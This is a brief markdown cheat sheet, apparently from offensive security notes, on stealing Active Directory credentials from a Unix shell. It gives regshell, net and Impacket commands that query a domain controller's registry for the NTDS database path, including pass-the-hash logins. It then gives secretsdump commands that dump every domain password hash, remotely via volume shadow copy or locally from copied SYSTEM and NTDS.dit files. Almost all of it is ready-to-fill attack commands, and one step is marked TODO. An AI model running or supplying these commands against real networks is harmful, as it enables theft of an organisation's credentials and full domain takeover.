# Unix Shell

## 01 - Enumerate Registry Files

### 1.1 - `regshell`

Authentication syntax.

```
$ regshell -U "[<domain>/]<username>%<password>" -R <IP>

$ regshell -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -R <IP>
```

```
cd "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"
```

### 1.2 - NetCommands

```
$ net <ads | rpc> registry getvalue "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" "DSA Database file" -U "[<domain>/]<username>%<password>" -S <IP>

$ net <ads | rpc> registry getvalue "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" "DSA Database file" -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -S <IP>
```

### 1.3 - Impacket

```
$ reg.py "<username>":"<password>"@<IP> query -keyName "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"
```

## 02 - Extract Shadow File

TODO: Demonstrate using smbclient to download hashes

`$ secretsdump -system /path/to/SYSTEM -ntds /path/to/NTDS.dit local`

```
$ secretsdump.py -use-vss "[<domain>/]<username>":"<password>"@<IP>

$ secretsdump.py -use-vss "[<domain>/]<username>"@<IP> -hashes :<nt_hash>
```